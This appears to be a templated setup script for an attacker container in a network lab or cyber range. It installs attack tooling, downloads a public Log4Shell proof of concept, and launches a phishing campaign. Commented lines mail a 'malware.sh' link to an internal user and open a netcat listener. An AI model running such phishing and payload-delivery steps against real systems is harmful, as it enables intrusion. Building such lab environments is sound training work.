#!/bin/sh

### set DNS first to avoid resolving issues related to the hosts DNS servers
docker exec -d clab-{{networkname}}-Attacker-WAN sh -c 'echo "nameserver 1.1.1.1
nameserver 8.8.8.8" > /etc/resolv.conf'

### install packages
docker exec clab-{{networkname}}-Attacker-WAN apt-get update -y
docker exec clab-{{networkname}}-Attacker-WAN apt-get install {{ basic_packages }}
docker exec clab-{{networkname}}-Attacker-WAN apt-get -yq install pip ssh git netcat unzip
docker exec clab-{{networkname}}-Attacker-WAN pip install atomic-operator
docker exec clab-{{networkname}}-Attacker-WAN atomic-operator get_atomics --destination "/root/atomic-operator"

### Log4J Attacker Dependencies
docker exec clab-{{networkname}}-Attacker-WAN curl -o /root/log4j/log4j-shell-poc.zip https://github.com/kozmer/log4j-shell-poc/archive/refs/heads/main.zip -O -J -L; 
docker exec clab-{{networkname}}-Attacker-WAN chmod 777 /root/log4j/log4j-shell-poc.zip
docker exec clab-{{networkname}}-Attacker-WAN unzip /root/log4j/log4j-shell-poc.zip -d /root/log4j/
docker exec clab-{{networkname}}-Attacker-WAN pip install -r /root/log4j/log4j-shell-poc-main/requirements.txt 
docker exec clab-{{networkname}}-Attacker-WAN cp /root/log4j/jdk-8u20-linux-x64.tar.gz /root/log4j/log4j-shell-poc-main
docker exec clab-{{networkname}}-Attacker-WAN mv /root/log4j/log4j-shell-poc-main/jdk-8u20-linux-x64.tar.gz /root/log4j/log4j-shell-poc-main/jdk1.8.0_20.tar.gz
docker exec clab-{{networkname}}-Attacker-WAN tar -xf /root/log4j/log4j-shell-poc-main/jdk1.8.0_20.tar.gz -C /root/log4j/log4j-shell-poc-main/
{# docker exec clab-{{networkname}}-Attacker-WAN bash exploitlog4j #}




docker exec -d clab-{{networkname}}-Attacker-WAN {{ ipv6_configuration }}
docker exec -d clab-{{networkname}}-Attacker-WAN ip addr add 10.0.0.3/8 dev eth1
docker exec -d clab-{{networkname}}-Attacker-WAN ip route delete default
docker exec -d clab-{{networkname}}-Attacker-WAN ip route add 0.0.0.0/0 via 10.0.0.1 dev eth1
docker exec clab-{{networkname}}-Attacker-WAN bash -c 'echo "nameserver 172.16.0.5" > /etc/resolv.conf'

### setup phising campaign
docker exec -d clab-{{networkname}}-Attacker-WAN bash -c 'python3 -m http.server &'
docker exec -d clab-{{networkname}}-Attacker-WAN bash -c 'bash sendPhisingmail.sh &'


{# 
# docker exec clab-{{networkname}}-Attacker-WAN bash -c "curl -svk --url 'smtp://172.16.0.7:25' --ssl-reqd --mail-from 'Excited' --mail-rcpt 'john@Server6-mail-DMZ' -F data='http://10.0.0.3:8000/malware.sh'"
# have a file named malware.sh with bash code
# python3 -m http.server &
# nc â€“nlvp 5555
#}




{# 
curl -sv --url 'smtp://172.16.0.7:25' --mail-from 'Excited' --mail-rcpt 'john@Server6-mail-DMZ' -F data='Testing some Mailgun awesomeness'

curl -svk --url 'smtp://172.16.0.7:25' --ssl-reqd --mail-from 'Excited' --mail-rcpt 'john@Server6-mail-DMZ' -F data='Testing some Mailgun awesomeness'


https://blog.edmdesigner.com/send-email-from-linux-command-line/

--upload-file

munpack
https://askubuntu.com/questions/168858/how-can-i-download-attachments-from-emails-through-terminal-using-getmail 




#}


